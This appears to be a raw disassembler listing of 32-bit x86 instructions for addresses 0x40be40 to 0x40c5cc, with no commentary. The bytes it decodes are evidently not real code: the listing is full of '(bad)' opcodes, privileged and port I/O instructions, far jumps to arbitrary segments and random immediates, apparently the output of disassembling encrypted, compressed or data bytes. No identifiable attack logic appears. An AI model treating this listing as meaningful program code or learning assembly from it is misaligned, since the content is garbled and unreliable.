  40be40:	and    al,0x74
  40be42:	dec    edi
  40be43:	ins    DWORD PTR es:[edi],dx
  40be44:	mov    dh,0xa3
  40be46:	jnp    0x40be61
  40be48:	dec    ebx
  40be49:	ffree  st(7)
  40be4b:	dec    edx
  40be4c:	cs hlt 
  40be4e:	pop    ecx
  40be4f:	dec    ebp
  40be50:	js     0x40bdd2
  40be52:	dec    ebp
  40be53:	cmp    esp,ecx
  40be55:	mov    ds:0x87d027b9,eax
  40be5a:	pop    edi
  40be5b:	xchg   ebp,eax
  40be5c:	adc    DWORD PTR [eax],edi
  40be5e:	sbb    DWORD PTR [eax],esp
  40be60:	adc    al,ah
  40be62:	jb     0x40bde6
  40be64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be65:	jne    0x40be85
  40be67:	inc    ebx
  40be68:	or     eax,0x9909cb1f
  40be6d:	or     al,0xad
  40be6f:	shl    edi,1
  40be71:	cmp    eax,0x9a89cb57
  40be76:	imul   ebx,DWORD PTR [esi],0x4c101f6a
  40be7c:	add    al,0x29
  40be7e:	mov    ecx,edx
  40be80:	lea    edi,[esi-0x2945216b]
  40be86:	sub    BYTE PTR [esi-0x41],bh
  40be89:	push   0x7a3f43d6
  40be8e:	cld    
  40be8f:	arpl   WORD PTR ds:0xfc1b8d87,dx
  40be95:	ror    BYTE PTR [eax],cl
  40be97:	push   0x6c
  40be99:	cli    
  40be9a:	sar    BYTE PTR [ecx-0x20],1
  40be9d:	push   0x718faec1
  40bea2:	hlt    
  40bea3:	and    DWORD PTR [eax+0x296b39f6],0xffffffcd
  40beaa:	jmp    0x3d6a:0x35745fb2
  40beb1:	xchg   ebp,eax
  40beb2:	inc    esp
  40beb3:	das    
  40beb4:	push   esp
  40beb5:	jp     0x40bf31
  40beb7:	pop    ebx
  40beb8:	fs ja  0x40be56
  40bebb:	into   
  40bebc:	pop    es
  40bebd:	daa    
  40bebe:	and    BYTE PTR ds:0x20cacea8,bh
  40bec4:	cld    
  40bec5:	call   0xb4e5:0xa8df2f6
  40becc:	loope  0x40bead
  40bece:	es es xchg ebp,eax
  40bed1:	popf   
  40bed2:	aad    0x25
  40bed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bed5:	jmp    FWORD PTR [ecx+0x1a9c41d]
  40bedb:	jmp    0x40be7c
  40bedd:	lods   al,BYTE PTR ds:[esi]
  40bede:	fucomp st(2)
  40bee0:	ret    
  40bee1:	(bad)  
  40bee2:	jns    0x40be7b
  40bee4:	or     al,0xa5
  40bee6:	jo     0x40bf47
  40bee8:	add    al,0xba
  40beea:	xor    esp,DWORD PTR [ecx-0x24c293d0]
  40bef0:	cwde   
  40bef1:	xchg   esi,eax
  40bef2:	scas   al,BYTE PTR es:[edi]
  40bef3:	lds    ebx,FWORD PTR [ebp-0x23]
  40bef6:	jns    0x40bf19
  40bef8:	mov    dl,BYTE PTR [edx]
  40befa:	mov    eax,0x8ea10720
  40beff:	outs   dx,DWORD PTR ds:[esi]
  40bf00:	mov    edx,0x59a2f755
  40bf05:	pop    ebx
  40bf06:	int    0x49
  40bf08:	or     eax,0x2e185043
  40bf0d:	sti    
  40bf0e:	mov    edi,0x7391b7ff
  40bf13:	sub    eax,0x4a4f7320
  40bf18:	adc    esi,eax
  40bf1a:	das    
  40bf1b:	enter  0x5a70,0xbf
  40bf1f:	fisub  DWORD PTR [ebx+0x3e4c0a64]
  40bf25:	fwait
  40bf26:	scas   eax,DWORD PTR es:[edi]
  40bf27:	mov    ecx,0xc9244292
  40bf2c:	sbb    esp,eax
  40bf2e:	add    eax,0x36009b63
  40bf33:	sub    DWORD PTR [esi+0x5f],esi
  40bf36:	mov    cl,0x93
  40bf38:	cmp    al,0xfc
  40bf3a:	test   eax,0x6d992612
  40bf3f:	pop    edx
  40bf40:	sbb    eax,0xc0b2783b
  40bf45:	sbb    al,0x6b
  40bf47:	daa    
  40bf48:	lea    eax,[ebp-0x40]
  40bf4b:	(bad)
  40bf4f:	mov    ecx,0x8a16c7bf
  40bf54:	stc    
  40bf55:	adc    esp,DWORD PTR [ebx+edx*1-0x14015169]
  40bf5c:	dec    ebx
  40bf5d:	mov    edx,0xc0eba48e
  40bf62:	lods   eax,DWORD PTR ds:[esi]
  40bf63:	mov    ds:0xa09fb707,al
  40bf68:	into   
  40bf69:	pop    ss
  40bf6a:	retf   
  40bf6b:	imul   eax,esp,0x7c
  40bf6e:	sub    al,0x55
  40bf70:	xchg   esp,eax
  40bf71:	dec    edx
  40bf72:	mov    DWORD PTR ss:[ebp+eax*1+0x9],ebx
  40bf77:	xchg   eax,ecx
  40bf79:	mov    edi,0x905da166
  40bf7e:	xlat   BYTE PTR ds:[ebx]
  40bf7f:	cmp    DWORD PTR [esi],edi
  40bf81:	dec    ebp
  40bf82:	popf   
  40bf83:	mov    ebp,0x3872f933
  40bf88:	repnz repz rcr DWORD PTR [ebx-0x1d2fe13b],0x5d
  40bf91:	sbb    al,0xd3
  40bf93:	out    dx,eax
  40bf94:	dec    ebp
  40bf95:	mov    al,0x51
  40bf97:	loop   0x40bfd6
  40bf99:	and    edx,DWORD PTR [eax-0x293a77f2]
  40bf9f:	rcl    BYTE PTR [ebp+0x76a2710c],1
  40bfa5:	cmp    DWORD PTR [eax-0x27be277d],ebx
  40bfab:	adc    eax,0x6b0bcd1a
  40bfb0:	jmp    0x8f3b:0xd9a42791
  40bfb7:	add    al,0xf0
  40bfb9:	sub    cl,BYTE PTR [esi-0x39]
  40bfbc:	(bad)  
  40bfbd:	in     al,dx
  40bfbe:	pop    ebp
  40bfbf:	fiadd  DWORD PTR [ebx+0x572d18f0]
  40bfc5:	arpl   WORD PTR [esi-0x56ca25a3],dx
  40bfcb:	popf   
  40bfcc:	out    dx,eax
  40bfcd:	ds ret 
  40bfcf:	cdq    
  40bfd0:	js     0x40c019
  40bfd2:	packuswb mm5,mm6
  40bfd5:	jmp    0x40c044
  40bfd7:	ror    ch,1
  40bfd9:	adc    ebx,DWORD PTR [edi]
  40bfdb:	test   ebp,edx
  40bfdd:	dec    ebx
  40bfde:	ss xchg esp,eax
  40bfe0:	pop    ebp
  40bfe2:	mov    ebx,0xf1cd1408
  40bfe7:	aad    0xe5
  40bfe9:	mov    ds:0xa5016269,eax
  40bfee:	cdq    
  40bfef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bff0:	add    ah,bh
  40bff2:	push   eax
  40bff3:	das    
  40bff4:	sub    eax,0xcb026e32
  40bff9:	fwait
  40bffa:	push   esp
  40bffb:	pop    ecx
  40bffc:	out    0x8f,al
  40bffe:	or     al,0xe1
  40c000:	fadd   DWORD PTR [eax-0x3c1f6bab]
  40c006:	call   0x8491:0xce99787
  40c00d:	or     BYTE PTR [ebp-0x45],al
  40c010:	mov    ch,0x98
  40c012:	lods   eax,DWORD PTR ds:[esi]
  40c013:	jg     0x40bfff
  40c015:	xor    al,0x65
  40c017:	(bad)  [eax-0x69]
  40c01a:	lahf   
  40c01b:	cmp    BYTE PTR [edx+edi*1+0x1e7278c0],cl
  40c022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c023:	aad    0xba
  40c025:	mov    cl,dh
  40c027:	ja     0x40c09d
  40c029:	mov    ch,0xa7
  40c02b:	(bad)  
  40c02c:	ins    BYTE PTR es:[edi],dx
  40c02d:	in     al,dx
  40c02e:	sbb    eax,0xfb49a958
  40c033:	dec    edx
  40c034:	imul   ecx
  40c036:	or     BYTE PTR [esi+edi*4+0xf],0x89
  40c03b:	loope  0x40bfee
  40c03d:	repnz call 0x4bb:0x7efe7fd9
  40c045:	into   
  40c046:	lahf   
  40c047:	cmp    BYTE PTR [ebp+0x7f59791b],bh
  40c04d:	aad    0x5c
  40c04f:	jne    0x40c0bb
  40c051:	jle    0x40c077
  40c053:	dec    edx
  40c055:	aad    0xc6
  40c057:	mov    esi,0x75523208
  40c05c:	nop
  40c05d:	sub    eax,0x16e3ccd7
  40c062:	lea    eax,[ecx]
  40c064:	xchg   BYTE PTR [ebx],cl
  40c066:	test   eax,0x2ae10536
  40c06b:	cld    
  40c06c:	add    DWORD PTR [edi],ecx
  40c06e:	inc    ebp
  40c06f:	das    
  40c070:	enter  0xf3c6,0x74
  40c074:	jo     0x40c04a
  40c076:	push   0x18739154
  40c07b:	in     eax,dx
  40c07c:	loope  0x40c09d
  40c07e:	or     BYTE PTR [edx+0x64],dh
  40c081:	(bad)  
  40c082:	cmp    cl,cl
  40c084:	ror    DWORD PTR [edx-0x5591ce3],cl
  40c08a:	clc    
  40c08b:	adc    eax,0x37da1422
  40c090:	or     esp,DWORD PTR [esp+ecx*8]
  40c093:	jle    0x40c097
  40c095:	adc    ebp,DWORD PTR [eax+0x67]
  40c098:	test   BYTE PTR [edi+0x254553e5],bl
  40c09e:	aas    
  40c09f:	mov    ebx,0x724509f0
  40c0a4:	retf   
  40c0a5:	jns    0x40c05f
  40c0a7:	push   esp
  40c0a8:	mul    ch
  40c0aa:	mov    ah,0x30
  40c0ac:	mov    esp,0xe12de3f0
  40c0b1:	cmp    al,0x1a
  40c0b3:	test   al,0x4c
  40c0b5:	es pop eax
  40c0b7:	or     DWORD PTR [ecx-0xb5f1861],0xffffff97
  40c0be:	aas    
  40c0bf:	xchg   BYTE PTR [ebp+0x54],cl
  40c0c2:	jle    0x40c12a
  40c0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0c5:	outs   dx,BYTE PTR ds:[esi]
  40c0c6:	jl     0x40c0ba
  40c0c8:	loopne 0x40c0c7
  40c0ca:	les    ebp,FWORD PTR [ebp+0x55]
  40c0cd:	fwait
  40c0ce:	xchg   esi,eax
  40c0cf:	loopne 0x40c0c5
  40c0d1:	push   esi
  40c0d2:	hlt    
  40c0d3:	retf   0x556b
  40c0d6:	stos   DWORD PTR es:[edi],eax
  40c0d7:	cld    
  40c0d8:	push   ecx
  40c0d9:	mov    eax,0x2d4c0019
  40c0de:	cmp    BYTE PTR [eax],dl
  40c0e0:	mov    esi,0xff0a5758
  40c0e5:	lahf   
  40c0e6:	ja     0x40c0aa
  40c0e8:	pop    ecx
  40c0e9:	xchg   DWORD PTR [ebx],esp
  40c0eb:	test   BYTE PTR [edx+0x7b],cl
  40c0ee:	sbb    edi,DWORD PTR [eax+0xd66b48]
  40c0f4:	cmp    BYTE PTR [ecx-0x53],al
  40c0f7:	test   al,0x2b
  40c0f9:	or     bh,ah
  40c0fb:	aaa    
  40c0fc:	mov    ds:0x1103ea2e,eax
  40c101:	push   ebx
  40c102:	into   
  40c103:	xor    DWORD PTR [ecx],ebp
  40c105:	das    
  40c106:	mov    ebp,0xaa7e4d46
  40c10b:	push   ebp
  40c10c:	outs   dx,BYTE PTR ds:[esi]
  40c10d:	mov    DWORD PTR [eax+0xe],esp
  40c110:	fsubr  st(2),st
  40c112:	jp     0x40c13b
  40c114:	ret    
  40c115:	xbegin 0xfcdf73e4
  40c11b:	jnp    0x40c0c0
  40c11d:	pop    ds
  40c11e:	callw  0x13f7
  40c122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c123:	fwait
  40c124:	stos   BYTE PTR es:[edi],al
  40c125:	xor    eax,0xd3b5b340
  40c12a:	mov    ch,0x24
  40c12c:	ss jmp 0x40c0fc
  40c12f:	into   
  40c130:	xlat   BYTE PTR ds:[ebx]
  40c131:	cmp    ah,BYTE PTR [eax+0x56]
  40c134:	mov    ah,0xf5
  40c136:	icebp  
  40c137:	add    edi,eax
  40c139:	pop    es
  40c13a:	pop    es
  40c13b:	sbb    BYTE PTR [ecx+ebx*4-0x60e65a4],al
  40c142:	mov    al,0x4d
  40c144:	int3   
  40c145:	inc    esp
  40c146:	cmc    
  40c147:	sbb    DWORD PTR [eax+ebp*4-0x18058168],esi
  40c14e:	adc    edi,DWORD PTR [ebp-0x3c65fb89]
  40c154:	in     eax,dx
  40c155:	mov    WORD PTR [esi],cs
  40c157:	nop
  40c158:	pop    eax
  40c159:	pop    ecx
  40c15a:	pushf  
  40c15b:	or     bh,BYTE PTR [eax-0x7fabb29d]
  40c161:	adc    edx,edi
  40c163:	or     DWORD PTR [eax+0x5892c5a6],ecx
  40c169:	popf   
  40c16a:	push   esp
  40c16b:	scas   al,BYTE PTR es:[edi]
  40c16c:	rcr    BYTE PTR [eax],1
  40c16e:	or     eax,0xcc4b3fc7
  40c173:	stos   DWORD PTR es:[edi],eax
  40c174:	mov    BYTE PTR [edx],ch
  40c176:	or     eax,0x2d080bb7
  40c17b:	stos   BYTE PTR es:[edi],al
  40c17c:	sub    BYTE PTR [ebp+edi*1-0xcf09788],ch
  40c183:	lahf   
  40c184:	push   esi
  40c185:	gs mov ecx,edi
  40c188:	xor    eax,0xc34ad4
  40c18d:	enter  0x6393,0x3e
  40c191:	cmp    esi,eax
  40c193:	shl    DWORD PTR [edx+0x1b298570],cl
  40c199:	jge    0x40c14c
  40c19b:	push   ebx
  40c19c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c19d:	or     cl,dh
  40c19f:	(bad)  
  40c1a0:	into   
  40c1a1:	jge    0x40c1ca
  40c1a3:	mov    edx,0xce329286
  40c1a8:	mov    ds:0x4e4b245f,al
  40c1ad:	adc    BYTE PTR [edi+0x9],cl
  40c1b0:	pop    ebp
  40c1b1:	push   eax
  40c1b2:	push   esi
  40c1b3:	enter  0x9cf7,0xf9
  40c1b7:	or     eax,0x7a9574b6
  40c1bc:	repnz aaa 
  40c1be:	push   cs
  40c1bf:	lock mov esp,0x12422315
  40c1c5:	(bad)  
  40c1c6:	std    
  40c1c7:	jns    0x40c180
  40c1c9:	jbe    0x40c1fa
  40c1cb:	and    bh,bh
  40c1cd:	(bad)  
  40c1ce:	jbe    0x40c1e6
  40c1d0:	push   ebx
  40c1d1:	mov    bl,0x8e
  40c1d3:	call   FWORD PTR [edi-0x799120f4]
  40c1d9:	mov    bl,0xcd
  40c1db:	mov    WORD PTR [ebp-0x63],?
  40c1de:	pop    edi
  40c1df:	xchg   esi,eax
  40c1e0:	or     al,0xe7
  40c1e2:	xor    al,0x69
  40c1e5:	jno    0x40c20f
  40c1e7:	jp     0x40c20e
  40c1e9:	xchg   ebx,eax
  40c1ea:	je     0x40c1fa
  40c1ec:	inc    esp
  40c1ed:	sar    DWORD PTR ds:0xb1fdaecb,1
  40c1f3:	cmp    BYTE PTR [edi+0x46],ah
  40c1f6:	cmp    eax,0x6224c933
  40c1fb:	inc    edi
  40c1fc:	test   al,0x3a
  40c1fe:	dec    esi
  40c1ff:	mov    eax,DWORD PTR [eax+0x69]
  40c202:	imul   edi,DWORD PTR [edi-0x593cecd],0xc8745399
  40c20c:	push   ss
  40c20d:	sub    eax,DWORD PTR [esi-0x40e85944]
  40c213:	fwait
  40c214:	repnz inc eax
  40c216:	call   0x8a290c15
  40c21b:	and    BYTE PTR [esi+0x1e03881d],bh
  40c221:	mov    ebx,DWORD PTR [ebx]
  40c223:	scas   al,BYTE PTR es:[edi]
  40c224:	rcr    DWORD PTR [eax-0x1ebd2fe0],1
  40c22a:	mov    ecx,0x2295206a
  40c22f:	fstp   TBYTE PTR ds:0xd2197984
  40c235:	loope  0x40c1eb
  40c237:	neg    dl
  40c239:	pushf  
  40c23a:	imul   ecx,ebx,0x50
  40c23d:	retf   0xe6f3
  40c240:	adc    al,0x97
  40c242:	mov    eax,ds:0xbe6bd830
  40c247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c248:	outs   dx,DWORD PTR ds:[esi]
  40c249:	js     0x40c2c0
  40c24b:	add    edx,edi
  40c24d:	dec    eax
  40c24e:	mov    bl,0x14
  40c250:	pushf  
  40c251:	ror    DWORD PTR [esi-0x64bda98],0x41
  40c258:	cmp    al,0xa8
  40c25a:	int3   
  40c25b:	imul   edx,esp,0x37
  40c25e:	cdq    
  40c25f:	or     BYTE PTR [edi+eiz*2-0x1c],bh
  40c263:	inc    ebx
  40c264:	mov    esp,0x4d0f2261
  40c269:	lods   al,BYTE PTR ds:[esi]
  40c26a:	push   ebx
  40c26b:	stc    
  40c26c:	sbb    esp,eax
  40c26e:	and    eax,0x15028c4
  40c273:	push   ebp
  40c274:	lahf   
  40c275:	lods   eax,DWORD PTR ds:[esi]
  40c276:	cmc    
  40c277:	or     BYTE PTR [ecx],cl
  40c279:	fcos   
  40c27b:	add    BYTE PTR [ebx-0x106cabbf],cl
  40c281:	pop    esp
  40c282:	rcl    DWORD PTR [edx],0xef
  40c285:	jnp    0x40c2a8
  40c287:	or     DWORD PTR [esp+edi*2+0x25407704],ebp
  40c28e:	scas   al,BYTE PTR es:[edi]
  40c28f:	ret    0x220b
  40c292:	and    BYTE PTR ds:0x6585c8d9,bh
  40c298:	int    0x2e
  40c29a:	cmp    al,BYTE PTR [edi]
  40c29c:	jge    0x40c251
  40c29e:	iret   
  40c29f:	rcr    BYTE PTR ds:0x40aac102,0x3b
  40c2a6:	push   edx
  40c2a7:	arpl   WORD PTR [ebx-0x7f],bp
  40c2aa:	dec    ebp
  40c2ab:	pop    ebp
  40c2ac:	scas   eax,DWORD PTR es:[edi]
  40c2ad:	icebp  
  40c2ae:	and    BYTE PTR [ebp+0x37],ch
  40c2b1:	fadd   DWORD PTR [ebx+0x30b7afa1]
  40c2b7:	enter  0x3602,0x38
  40c2bb:	std    
  40c2bc:	ret    0xb4f
  40c2bf:	int    0xf0
  40c2c1:	in     al,0x5
  40c2c3:	jae    0x40c257
  40c2c5:	inc    esi
  40c2c6:	add    eax,0x5399763d
  40c2cb:	inc    ebx
  40c2cc:	sar    BYTE PTR [edi-0x6f],cl
  40c2cf:	es jmp 0xdff4f3e4
  40c2d5:	pusha  
  40c2d6:	(bad)  
  40c2d7:	retf   0x95be
  40c2da:	pop    ds
  40c2db:	int3   
  40c2dc:	xchg   esi,eax
  40c2dd:	shl    ah,1
  40c2df:	push   edi
  40c2e0:	pop    ds
  40c2e1:	xchg   edi,eax
  40c2e2:	add    al,0x21
  40c2e4:	dec    esi
  40c2e5:	xacquire xchg BYTE PTR [edx-0x16],bh
  40c2e9:	mov    al,dl
  40c2eb:	(bad)  
  40c2ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ed:	not    DWORD PTR [esi]
  40c2ef:	data16 xor dl,BYTE PTR [edi]
  40c2f2:	into   
  40c2f3:	jl     0x40c2df
  40c2f5:	fwait
  40c2f6:	xlat   BYTE PTR ds:[ebx]
  40c2f7:	mov    ecx,0xcca29e1c
  40c2fc:	iret   
  40c2fd:	popa   
  40c2fe:	repnz fs retf 0x9692
  40c303:	push   ds
  40c304:	xchg   esp,eax
  40c305:	adc    DWORD PTR [esi+edx*8],ecx
  40c308:	in     al,dx
  40c309:	sub    BYTE PTR [ebx],bh
  40c30b:	jmp    0x2fda20c3
  40c310:	sbb    DWORD PTR [ebx],eax
  40c312:	call   0xd03b:0x12086388
  40c319:	jno    0x40c2fd
  40c31b:	test   eax,0xef046b98
  40c320:	dec    esi
  40c321:	jmp    DWORD PTR [edx]
  40c323:	neg    bl
  40c325:	pop    ss
  40c326:	adc    edi,DWORD PTR [ebx]
  40c328:	repz in al,dx
  40c32a:	jle    0x40c2e6
  40c32c:	mov    ebp,0x5b0d4372
  40c331:	fcom   st(0)
  40c333:	push   ss
  40c334:	inc    esp
  40c335:	add    eax,0xa106758f
  40c33a:	repnz push 0x303477a6
  40c340:	sub    DWORD PTR [edi+0x16],esp
  40c343:	je     0x40c32f
  40c345:	(bad)  
  40c346:	enter  0x15d0,0x2
  40c34a:	adc    ah,BYTE PTR [edx]
  40c34c:	test   edx,0x1e6636f1
  40c352:	call   0x632424b0
  40c357:	dec    edx
  40c358:	neg    BYTE PTR [esi+0x7a]
  40c35b:	ret    0x5611
  40c35e:	icebp  
  40c35f:	xchg   ebp,eax
  40c360:	das    
  40c361:	mov    ch,0x2a
  40c363:	mov    edi,0xc9e2726c
  40c368:	js     0x40c3cc
  40c36a:	les    edi,FWORD PTR es:[esi]
  40c36d:	xor    ecx,DWORD PTR [ecx-0x18]
  40c370:	and    eax,0x5dc1a48f
  40c375:	stos   BYTE PTR es:[edi],al
  40c376:	mov    ebp,0x16537355
  40c37b:	daa    
  40c37c:	jecxz  0x40c36b
  40c37e:	mov    bl,0xb3
  40c380:	dec    edx
  40c381:	and    esi,DWORD PTR [eax-0xb]
  40c384:	rcr    BYTE PTR [bx],0xdf
  40c388:	xchg   edi,edx
  40c38a:	je     0x40c3c0
  40c38c:	pop    ebp
  40c38d:	sar    DWORD PTR [edx],cl
  40c38f:	repnz out dx,al
  40c391:	mov    ah,0x41
  40c393:	add    dl,BYTE PTR [ebx-0x9d3deb6]
  40c399:	xchg   esp,eax
  40c39a:	mov    eax,0x670142fe
  40c39f:	dec    ecx
  40c3a0:	xchg   ebx,eax
  40c3a1:	mov    esp,0x5f595fc
  40c3a6:	enter  0x9903,0x10
  40c3aa:	repnz pop edx
  40c3ac:	sbb    DWORD PTR [eax],esp
  40c3ae:	mov    dl,ah
  40c3b0:	pop    eax
  40c3b1:	pop    esi
  40c3b2:	adc    ebp,DWORD PTR [ecx+esi*4+0x3c]
  40c3b6:	cwde   
  40c3b7:	mov    dh,0xe1
  40c3b9:	outs   dx,BYTE PTR ds:[esi]
  40c3ba:	jp     0x40c40d
  40c3bc:	pop    ss
  40c3bd:	mov    eax,ds:0x527c2377
  40c3c2:	loope  0x40c3bc
  40c3c4:	cmp    BYTE PTR [eax-0x18],al
  40c3c7:	mov    bh,0xeb
  40c3c9:	jge    0x40c3d4
  40c3cb:	or     al,0x72
  40c3cd:	rcl    BYTE PTR [eax+0x54],cl
  40c3d0:	cmp    DWORD PTR [ebp+ebp*8-0x3da1da16],esp
  40c3d7:	enter  0x529b,0x6a
  40c3db:	dec    edx
  40c3dc:	and    BYTE PTR [eax],ah
  40c3de:	data16 test BYTE PTR [eax+edx*8+0x579acbb5],0xf3
  40c3e7:	cmp    bl,al
  40c3e9:	and    ecx,edx
  40c3eb:	jmp    0x34fa9111
  40c3f0:	mov    ebx,0xb2ce0d39
  40c3f5:	pusha  
  40c3f6:	arpl   WORD PTR [eax],bx
  40c3f8:	push   esp
  40c3f9:	adc    esp,esp
  40c3fb:	and    cl,BYTE PTR [ecx+0x44da4cd8]
  40c401:	scas   eax,DWORD PTR es:[edi]
  40c402:	test   al,0x3c
  40c404:	mov    WORD PTR [ecx+0x55],ss
  40c407:	pop    ebx
  40c408:	(bad)  
  40c409:	fsubr  QWORD PTR [edi+0x1]
  40c40c:	xchg   edi,eax
  40c40d:	mov    edi,0x79d68754
  40c412:	and    al,0x1d
  40c414:	test   ebp,edx
  40c416:	adc    esi,ebx
  40c418:	sub    ch,ah
  40c41a:	add    DWORD PTR ds:0x6dab19b1,edi
  40c420:	mov    al,ds:0x3bebb67b
  40c425:	and    BYTE PTR [eax-0x40],al
  40c428:	jge    0x40c3cb
  40c42a:	fistp  WORD PTR [esi*2+0x619811f4]
  40c431:	ins    DWORD PTR es:[edi],dx
  40c432:	jmp    0x40c44b
  40c434:	and    al,0x68
  40c436:	pusha  
  40c437:	ret    0x77b9
  40c43a:	push   ds
  40c43b:	inc    ecx
  40c43c:	dec    edi
  40c43d:	dec    eax
  40c43e:	mov    edx,ebp
  40c440:	(bad)  
  40c442:	cmp    BYTE PTR [ebx],dh
  40c444:	mov    ebx,0xf258c213
  40c449:	in     eax,dx
  40c44a:	gs mov esi,0x46acee6a
  40c450:	js     0x40c47a
  40c452:	mov    dl,cl
  40c454:	dec    esi
  40c455:	imul   ebp,ebx,0x5a
  40c458:	dec    ebp
  40c459:	xor    edx,DWORD PTR [ecx-0x3e]
  40c45c:	pop    es
  40c45d:	out    0x3f,al
  40c45f:	cmp    DWORD PTR [ebx],0x39be7d75
  40c465:	gs leave 
  40c467:	mov    ecx,0x347ddbf0
  40c46c:	fisttp DWORD PTR [edx+0x2c]
  40c46f:	mov    ah,0x9f
  40c471:	scas   al,BYTE PTR es:[edi]
  40c472:	mov    ds:0x12cd8ce7,eax
  40c477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c478:	ins    BYTE PTR es:[edi],dx
  40c479:	in     eax,0x90
  40c47b:	or     DWORD PTR ds:0x4bdc64c1,ebx
  40c481:	xchg   ebx,eax
  40c482:	mov    ebx,0x10f5934e
  40c487:	and    al,cl
  40c489:	lods   al,BYTE PTR cs:[esi]
  40c48b:	mov    esp,0x8ae8030c
  40c490:	ins    BYTE PTR es:[edi],dx
  40c491:	add    al,0xc0
  40c493:	mov    bl,bl
  40c495:	call   0x6904:0x49b9c1f5
  40c49c:	dec    esi
  40c49d:	pusha  
  40c49e:	nop
  40c49f:	jmp    0x40c4ee
  40c4a1:	sub    esp,ecx
  40c4a3:	fsub   QWORD PTR [ecx+0x2d]
  40c4a6:	fbld   TBYTE PTR [ebp+ebp*2-0x10]
  40c4aa:	sub    cl,dl
  40c4ac:	cmp    bh,cl
  40c4ae:	(bad)  [edi-0x7b]
  40c4b1:	cwde   
  40c4b2:	outs   dx,BYTE PTR ds:[esi]
  40c4b3:	xchg   edi,eax
  40c4b4:	and    al,0xd7
  40c4b6:	popa   
  40c4b7:	dec    ecx
  40c4b8:	cmp    eax,edi
  40c4ba:	ins    BYTE PTR es:[edi],dx
  40c4bb:	pop    ecx
  40c4bc:	neg    BYTE PTR [edx+ecx*8+0x3c1ac418]
  40c4c3:	sub    DWORD PTR [ebp-0x34],eax
  40c4c6:	inc    DWORD PTR [edi+0x70]
  40c4c9:	push   0xbc77c7df
  40c4ce:	imul   edx,DWORD PTR [eax+eax*4+0x68],0x33
  40c4d3:	xor    DWORD PTR [edx-0x7ee349ed],0x7d
  40c4da:	sti    
  40c4db:	push   edx
  40c4dc:	std    
  40c4dd:	out    0xc1,al
  40c4df:	fwait
  40c4e0:	mov    edx,DWORD PTR [edi-0x798c5d67]
  40c4e6:	sbb    esi,DWORD PTR ds:0xa909d107
  40c4ec:	sar    BYTE PTR [edx+0x2fac55e4],0xca
  40c4f3:	jbe    0x40c545
  40c4f5:	jmp    0x40c4cb
  40c4f7:	jmp    0xdbaa7923
  40c4fc:	or     eax,0x73a2857
  40c501:	bound  esp,QWORD PTR [ebx]
  40c503:	js     0x40c54f
  40c505:	jne    0x40c4c3
  40c507:	lods   eax,DWORD PTR ds:[esi]
  40c508:	sub    DWORD PTR [esp+edi*2-0x20],esp
  40c50c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c50d:	mov    ebp,0x93bfe41e
  40c512:	and    bh,BYTE PTR [ebx+ebx*1-0x4f2db094]
  40c519:	pushf  
  40c51a:	sbb    eax,0xa9d2f13b
  40c51f:	(bad)  
  40c520:	push   edi
  40c521:	or     al,0x70
  40c523:	pop    ecx
  40c524:	sbb    edx,DWORD PTR [esi]
  40c526:	inc    esi
  40c527:	fisttp QWORD PTR [ebx]
  40c529:	cmp    ah,BYTE PTR [ebp+0x7d]
  40c52c:	mov    ds:0x8b08cd13,al
  40c531:	cmp    BYTE PTR ds:0xf2108028,0x34
  40c538:	mov    bl,0x75
  40c53a:	mov    ?,WORD PTR [ebp-0x28]
  40c53d:	scas   al,BYTE PTR es:[edi]
  40c53e:	and    ecx,eax
  40c540:	or     BYTE PTR [esp+ebx*1-0x11],0x7b
  40c545:	(bad)  
  40c546:	je     0x40c565
  40c548:	stos   DWORD PTR es:[edi],eax
  40c549:	js     0x40c541
  40c54b:	adc    al,0x1b
  40c54d:	mov    edi,0xd1d96a1c
  40c552:	aas    
  40c553:	repnz sahf 
  40c555:	adc    al,0xd8
  40c557:	ins    DWORD PTR es:[edi],dx
  40c558:	popf   
  40c559:	sub    DWORD PTR [esi-0x3e],eax
  40c55c:	jp     0x40c4e2
  40c55e:	pop    eax
  40c55f:	stc    
  40c560:	or     BYTE PTR [edi-0x691f6a6],al
  40c566:	inc    ebx
  40c567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c568:	push   ebx
  40c569:	jb     0x40c4f5
  40c56b:	inc    ecx
  40c56c:	aaa    
  40c56d:	pop    edx
  40c56e:	xchg   edi,eax
  40c56f:	mov    esp,0xb6a545ee
  40c574:	aad    0x8a
  40c576:	test   DWORD PTR [eax],ebp
  40c578:	fcomp  QWORD PTR [eax+0x61]
  40c57b:	aas    
  40c57c:	arpl   WORD PTR [ebx],bp
  40c57e:	sbb    edi,ebx
  40c580:	mov    ebp,0x976b2f9e
  40c585:	hlt    
  40c586:	dec    ecx
  40c587:	push   ecx
  40c588:	sbb    bl,BYTE PTR [ebx+0xdb622c9]
  40c58e:	push   0xfffffff0
  40c590:	fcomp  QWORD PTR [ebp+ecx*1+0xfdf38ff]
  40c597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c598:	lds    ebp,FWORD PTR [edx+0x7]
  40c59b:	sbb    BYTE PTR [ecx-0x7c940606],0xb3
  40c5a2:	mov    ah,0x6
  40c5a4:	call   0x8d788b2c
  40c5a9:	in     al,dx
  40c5aa:	jo     0x40c5a2
  40c5ac:	rcr    BYTE PTR [edx-0x227312fd],1
  40c5b2:	cld    
  40c5b3:	sbb    al,0x3f
  40c5b5:	mov    bl,0xd2
  40c5b7:	adc    al,BYTE PTR [ebx+esi*4-0x74]
  40c5bb:	push   esi
  40c5bc:	xlat   BYTE PTR ds:[ebx]
  40c5bd:	pop    es
  40c5be:	adc    edx,DWORD PTR [esi]
  40c5c0:	push   edx
  40c5c1:	nop
  40c5c2:	not    DWORD PTR [ebx+0x58]
  40c5c5:	mov    edx,DWORD PTR [ebx-0x4c]
  40c5c8:	xor    esp,esp
  40c5ca:	(bad)  
  40c5cc:	mov    ecx,0x2eb2dbe0
